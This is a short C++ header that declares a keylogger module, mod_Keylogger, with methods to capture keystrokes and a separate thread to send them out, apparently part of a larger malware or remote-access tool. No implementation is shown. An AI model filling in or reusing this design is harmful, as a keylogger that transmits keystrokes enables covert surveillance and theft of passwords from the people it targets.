#ifndef __KEY_MOD
#define __KEY_MOD

#include "headers.hpp"

class mod_Keylogger {
	public:
		mod_Keylogger();

		void Start();
		void Stop();
		void CaptureKeys();
		void SendThread();

	private:
		std::mutex mtx_Run;

		bool isRunning = false;

		bool m_IsRunning();
		
		std::thread thKey;
		std::thread thSend;
};

#endif
